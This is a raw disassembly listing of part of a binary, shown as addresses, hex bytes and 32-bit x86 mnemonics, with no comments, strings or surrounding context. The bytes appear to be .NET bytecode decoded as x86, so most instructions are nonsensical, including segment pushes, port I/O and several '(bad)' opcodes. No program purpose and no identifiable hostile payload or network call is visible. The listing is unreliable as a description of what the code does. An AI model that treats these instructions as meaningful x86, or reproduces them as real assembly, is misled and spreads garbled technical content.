  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 9e             	or     -0x62(%edx),%dh
  403d47:	23 00                	and    (%eax),%eax
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 a4                	jb     0x403d65
  403dc1:	23 00                	and    (%eax),%eax
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 04                	jb     0x403dd6
  403dd2:	28 00                	sub    %al,(%eax)
  403dd4:	70 28                	jo     0x403dfe
  403dd6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 0e                	jb     0x403df0
  403de2:	28 00                	sub    %al,(%eax)
  403de4:	70 28                	jo     0x403e0e
  403de6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 1c                	jb     0x403e0e
  403df2:	28 00                	sub    %al,(%eax)
  403df4:	70 28                	jo     0x403e1e
  403df6:	25 00 00 0a 3a       	and    $0x3a0a0000,%eax
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 a4 23 00       	and    $0x23a472,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 04                	jb     0x403e20
  403e1c:	28 00                	sub    %al,(%eax)
  403e1e:	70 6f                	jo     0x403e8f
  403e20:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e26:	bc 23 00 70 6f       	mov    $0x6f700023,%esp
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 32                	jb     0x403e85
  403e53:	28 00                	sub    %al,(%eax)
  403e55:	70 6f                	jo     0x403ec6
  403e57:	7f 00                	jg     0x403e59
  403e59:	00 06                	add    %al,(%esi)
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 a4 23 00       	and    $0x23a472,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 3a                	jb     0x403ec1
  403e87:	28 00                	sub    %al,(%eax)
  403e89:	70 6f                	jo     0x403efa
  403e8b:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e91:	50                   	push   %eax
  403e92:	28 00                	sub    %al,(%eax)
  403e94:	70 6f                	jo     0x403f05
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 32                	jb     0x403ecf
  403e9d:	28 00                	sub    %al,(%eax)
  403e9f:	70 6f                	jo     0x403f10
  403ea1:	7f 00                	jg     0x403ea3
  403ea3:	00 06                	add    %al,(%esi)
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 5e                	jb     0x403f39
  403edb:	28 00                	sub    %al,(%eax)
  403edd:	70 6f                	jo     0x403f4e
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 32                	jb     0x403f1d
  403eeb:	28 00                	sub    %al,(%eax)
  403eed:	70 6f                	jo     0x403f5e
  403eef:	7f 00                	jg     0x403ef1
  403ef1:	00 06                	add    %al,(%esi)
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 32             	or     %esi,0x32(%edx)
  403f1e:	28 00                	sub    %al,(%eax)
  403f20:	70 6f                	jo     0x403f91
  403f22:	7f 00                	jg     0x403f24
  403f24:	00 06                	add    %al,(%esi)
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 5e                	jb     0x403f8c
  403f2e:	28 00                	sub    %al,(%eax)
  403f30:	70 6f                	jo     0x403fa1
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 32                	jb     0x40401a
  403fe8:	28 00                	sub    %al,(%eax)
  403fea:	70 6f                	jo     0x40405b
  403fec:	7f 00                	jg     0x403fee
  403fee:	00 06                	add    %al,(%esi)
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 68             	or     0x68(%edx),%dh
  404006:	28 00                	sub    %al,(%eax)
  404008:	70 6f                	jo     0x404079
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 84             	add    %dh,-0x7c(%edx)
  404025:	28 00                	sub    %al,(%eax)
  404027:	70 14                	jo     0x40403d
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 8c                	jb     0x404051
  4040c5:	28 00                	sub    %al,(%eax)
  4040c7:	70 6f                	jo     0x404138
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 ba                	jb     0x4040cd
  404113:	28 00                	sub    %al,(%eax)
  404115:	70 73                	jo     0x40418a
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 02             	add    %dh,0x2(%edx)
  404180:	29 00                	sub    %eax,(%eax)
  404182:	70 73                	jo     0x4041f7
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
